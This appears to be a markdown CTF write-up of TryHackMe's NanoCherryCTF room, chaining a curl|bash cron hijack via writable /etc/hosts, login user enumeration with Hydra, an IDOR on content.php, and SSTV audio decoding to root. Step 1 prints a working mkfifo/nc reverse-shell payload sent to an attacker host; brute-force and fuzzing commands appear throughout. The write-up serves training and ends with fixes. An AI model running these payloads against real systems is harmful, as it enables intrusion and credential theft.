@@ -1,0 +1,208 @@
+---
+title: 'NanoCherryCTF'
+description: 'A writable /etc/hosts hijacks a curl-pipe-bash cronjob for lateral movement, username enumeration and an IDOR scatter a root password across four users, and an SSTV-encoded WAV finally hands over the root password.'
+date: 2026-01-10
+platform: tryhackme
+room: 'NanoCherryCTF'
+roomUrl: 'https://tryhackme.com/room/nanocherryctf'
+difficulty: medium
+tags:
+  - 'web'
+  - 'idor'
+  - 'steganography'
+  - 'password-cracking'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'username enumeration'
+  - 'insecure direct object reference'
+  - 'insecure command execution'
+  - 'security through obscurity'
+translation: done
+draft: false
+---
+
+## **NanoCherryCTF — A curl|bash Cron, an IDOR, and a Root Password Hidden in Audio**
+
+_A walkthrough of TryHackMe's "NanoCherryCTF" box. The real theme is security through obscurity done badly: a root password is split into segments scattered across four separate users, each reachable independently. We island-hop from_ _`notsus`_ _by hijacking a_ _`curl | bash`_ _cron via a writable_ _`/etc/hosts`\*\*, enumerate a hidden admin user and brute it, pull a fourth user's creds through an IDOR, then collect every password segment — and decode the final root password out of an SSTV audio file._
+
+> The flags, cracked passwords, and target IP are redacted. NanoCherryCTF is an authorized training box on TryHackMe; everything here was performed against a legal practice target. Flags are shown as `THM{<redacted>}` and recovered secrets as `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+vhost fuzzing finds `nano.cherryontop.thm` with an admin panel and a login-gated `command.php`, which yields an initial SSH foothold as **`notsus`** → `/etc/crontab` shows **`bob-boba`** **runs** **`curl cherryontop.tld:8000/... | bash`** every minute, and `/etc/hosts` is **writable**, so we point `cherryontop.tld` at our box, serve a reverse-shell `coinflip.sh`, and become **`bob-boba`** (password segment 3) → the nano login page leaks valid users ("This user doesn't exist"), so we enumerate to `puppet` and brute its password, log into the panel for **molly-milk**'s credentials, and SSH in (segment 1) → `content.php?facts=<id>&user=<base32>` is an **IDOR**: encode `sam-sprinkles` in Base32, fuzz IDs, and recover **sam-sprinkles**' creds (segment 2) → concatenate the three segments to log in as **chad-cherry** → his `rootPassword.wav` is an **SSTV** transmission; decode it to an image that spells the **root password** → `su root`.
+
+Writable `/etc/hosts` → cron hijack → user enum + brute → IDOR → collect split password → SSTV stego → root.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+Only SSH and Apache are open. The site needs a hostname, so we add `cherryontop.thm` to our hosts file and fuzz for virtual hosts:
+
+```text
+80/tcp open  http  Apache httpd 2.4.52 (Ubuntu)  — "Cherry on Top Ice Cream Shop"
+22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
+```
+
+```text
+ffuf -u http://cherryontop.thm -H 'Host:FUZZ.cherryontop.thm' \
+     -w subdomains-top1million-110000.txt -fw 5633
+# nano   [Status: 200, Size: 10718]
+```
+
+`nano.cherryontop.thm` is an admin portal; directory scanning behind its login reveals `login.php` and a `command.php`. Enumerating the panel gives an initial SSH foothold as the low-privileged user **`notsus`**, whose home holds a friendly note nudging us toward `bob-boba`.
+
+### **The vulnerability — secrets hidden instead of protected**
+
+The whole box leans on obscurity: a root password broken into pieces handed to different users, a hidden admin account, records addressed by a Base32 username, and a final secret buried in an audio file. None of that is real access control.
+
+<Callout type="insight">
+
+Hiding a secret is not the same as protecting it. A **writable** **`/etc/hosts`** turns a `curl | bash` cron into remote code execution; a login form that distinguishes "no such user" from "bad password" is a free **user-enumeration oracle**; an endpoint keyed by a guessable id and a Base32-encoded username is an **IDOR**; and a password "hidden" as an SSTV tone is a `sstv -d` away from plaintext. Splitting a password across users adds steps, not security.
+
+</Callout>
+
+### **Step 1 — hijack a curl|bash cron via writable /etc/hosts**
+
+As `notsus`, the system crontab shows a job running as `bob-boba` every minute that pipes a remote script straight into bash:
+
+```text
+cat /etc/crontab
+# *  *  * * *   bob-boba   curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
+```
+
+`/etc/hosts` is writable, so we make `cherryontop.tld` resolve to us and serve a matching path:
+
+```text
+echo '$ATTACKER_IP cherryontop.tld' >> /etc/hosts
+```
+
+```text
+# attacker: serve the hijacked script and catch the shell
+mkdir -p home/bob-boba
+cat > home/bob-boba/coinflip.sh <<'EOF'
+#!/bin/bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP 4445 >/tmp/f
+EOF
+python3 -m http.server 8000
+nc -lnvp 4445
+```
+
+Within a minute the cron fetches _our_ `coinflip.sh` and we land as `bob-boba`, holding the third password segment and a log file:
+
+```text
+bob-boba@...:~$ cat chads-key3.txt   # segment 3: <redacted>
+```
+
+### **Step 2 — enumerate and brute the hidden panel user (→ molly-milk)**
+
+The nano login page returns different messages for unknown users vs. wrong passwords — a user-enumeration oracle. Hydra finds a valid account, then cracks its password:
+
+```text
+hydra -L xato-net-10-million-usernames.txt -p asdf nano.cherryontop.thm \
+  http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist"
+# login: puppet
+hydra -l puppet -P rockyou.txt nano.cherryontop.thm \
+  http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:Bad password"
+# puppet : <redacted>
+```
+
+Logging in as `puppet` reveals the panel's content, including **molly-milk**'s password. We SSH in and collect the first segment:
+
+```text
+ssh molly-milk@cherryontop.thm
+molly-milk@...:~$ cat chads-key1.txt   # segment 1: <redacted>
+```
+
+### **Step 3 — IDOR on content.php (→ sam-sprinkles)**
+
+The main site's `content.php` serves records by numeric `facts` id and a Base32-encoded `user`. Changing the user to another account and brute-forcing ids leaks their data. Encode `sam-sprinkles` to Base32 and fuzz:
+
+```text
+seq 10000 > ids.txt
+ffuf -u 'http://cherryontop.thm/content.php?facts=FUZZ&user=ONQW2LLTOBZGS3TLNRSXG===' \
+     -w ids.txt -mc all -fr "Error"
+# id 43 -> sam-sprinkles credentials
+```
+
+ID 43 returns `sam-sprinkles`' login. SSH in for the second segment:
+
+```text
+ssh sam-sprinkles@cherryontop.thm
+sam-sprinkles@...:~$ cat chads-key2.txt   # segment 2: <redacted>
+```
+
+### **Step 4 — assemble the split password (→ chad-cherry)**
+
+The three notes make it explicit: chad's SSH password was split into three parts and handed to molly, sam, and bob. Concatenate `segment1 + segment2 + segment3` and log in as `chad-cherry`:
+
+```text
+ssh chad-cherry@cherryontop.thm   # password = <segment1><segment2><segment3> (redacted)
+chad-cherry@...:~$ cat chad-flag.txt
+# THM{<redacted>}
+chad-cherry@...:~$ ls
+# Hello.txt  rootPassword.wav   <- Hello.txt says the WAV holds the root password
+```
+
+### **Step 5 — decode the root password from an SSTV audio file**
+
+Viewed in Audacity, `rootPassword.wav` shows a digital pattern in the spectrogram — it's an **SSTV** (slow-scan television) transmission. Decode it to an image:
+
+```text
+scp chad-cherry@cherryontop.thm:/home/chad-cherry/rootPassword.wav .
+git clone https://github.com/colaclanth/sstv.git && cd sstv
+python3 -m venv venv && source venv/bin/activate && python3 setup.py install
+sstv -d ../rootPassword.wav -o root.png
+# [sstv] Detected SSTV mode Robot 36  ->  decodes an image
+```
+
+The decoded image spells the root password. `su` to root and read the final flag:
+
+```text
+chad-cherry@...:~$ su root     # password from root.png (redacted)
+root@...:~# cat /root/root-flag.txt
+# THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). A low-privileged foothold reaches root through a chain of obscurity-based controls:
+
+- **Writable** **`/etc/hosts`** **+** **`curl | bash`** **cron** — arbitrary code execution as another user, fully deterministic.
+- **Login-based user enumeration** — distinct error messages reveal valid accounts and feed a targeted password brute.
+- **IDOR on** **`content.php`** — swapping a Base32 username and iterating ids discloses other users' credentials.
+- **Secrets hidden, not protected** — a split password and an SSTV-encoded root password add friction but no real defence; once reachable, each piece falls.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Make** **`/etc/hosts`** **root-only and never pipe remote content into a shell.** Fetch to a file, verify a signature/checksum, and run from a trusted, root-owned path.
+2. **Return identical login errors** for unknown users and wrong passwords, and rate-limit attempts to kill enumeration and brute-forcing.
+3. **Enforce authorization on** **`content.php`** — bind every record to the authenticated session and use unguessable identifiers; Base32-encoding a username is not access control.
+4. **Don't rely on obscurity.** Splitting or hiding a password (including in audio/stego) is not a security boundary; use real authentication and secret management.
+
+</Callout>
+
+### **Takeaways**
+
+- **Writable** **`/etc/hosts`** **is RCE when something does** **`curl | bash`\*\***.\*\* Redirect the hostname, serve your own script, and inherit the cron's user.
+- **Different login errors are an oracle.** "This user doesn't exist" vs. "Bad password" hands an attacker a validated username list for free.
+- **IDOR plus a predictable key leaks everyone.** A Base32 username and a small id range is enough to walk every record.
+- **Obscurity is not security.** A password split across users or buried in an SSTV tone only adds steps — each one is recoverable.
+
+Thanks for reading. NanoCherryCTF is a long but gentle chain whose lesson is singular: hiding secrets — across users, behind encodings, inside audio — is not the same as protecting them.
